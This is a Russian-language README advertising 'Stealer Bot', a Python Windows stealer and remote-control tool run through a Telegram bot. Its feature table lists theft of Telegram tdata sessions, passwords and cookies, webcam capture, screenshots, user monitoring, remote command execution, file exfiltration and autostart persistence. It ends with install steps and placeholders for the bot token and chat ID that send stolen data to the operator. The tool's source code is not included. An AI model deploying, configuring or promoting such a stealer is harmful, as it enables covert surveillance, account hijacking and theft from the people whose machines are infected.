# Stealer Bot — Многофункциональный Windows-стилер (2025)

> **Полный контроль над Windows-устройством**  
> Пароли • Куки • tdata • Скриншоты • Управление • Мониторинг

![Python](https://img.shields.io/badge/Python-3.11-blue?logo=python)
![Windows](https://img.shields.io/badge/Windows-10%2B-red?logo=windows)
![Status](https://img.shields.io/badge/Status-Active-brightgreen)
![License](https://img.shields.io/badge/License-Private-red)

---

## Возможности

| Функции | Описание |
|--------|--------|
| **tdata** | Автокража сессий Telegram (AyuGram, Desktop) |
| **Скриншоты** | `/screenshot` — мгновенно |
| **Вебкамера** | `/webcam` — фото с камеры |
| **Обои** | `/imagepc` + фото → смена фона |
| **Мониторинг** | Что делает юзер: Chrome, CS2, Discord |
| **Управление** | Блокировка мыши/клавиатуры, выключение, перезагрузка |
| **Просмотр Файлов** | `/listfiles`, `/downloadfile`, пагинация |
| **CMD** | `/executecmd` — выполнение команд |
| **Звук** | `/sound`, `/setvolume`, `/offvolume` |
| **Wi-Fi** | `/onwifi`, `/offwifi` |
| **Rickroll** | `/rickroll` — классика |
| **Мышка** | Круги, скрытие курсора, переворот экрана |
| **Автозапуск** | Добавляется в `Startup` |
| **Мультиустройства** | `/listdevices`, `/selectdevice` |

---

## Демонстрация

<p align="center">
  <img src="https://i.imgur.com/EXAMPLE1.png" width="45%" />
  <img src="https://i.imgur.com/EXAMPLE2.png" width="45%" />
</p>

> *Примеры: кража tdata, мониторинг, управление файлами*

---

## Установка

```bash
# 1. Скачиваем
.ZIP архив

# 2. Устанавливаем зависимости
pip install -r requirements.txt

# 3. Запускаем
python op.py
```
## requirements.txt
```bash
aiogram==2.25.1
requests
psutil
pyautogui
opencv-python
pillow
pycryptodome
pywin32
pycaw
keyboard
telethon
python-pptx
```
## Настройка

Замени ТОКЕН БОТА
```
self.bot_token = 'TOKEN_BOT'
```
Замени ЧАТ АЙДИ
```
self.chat_id = 'YOU_CHAT_ID'
```
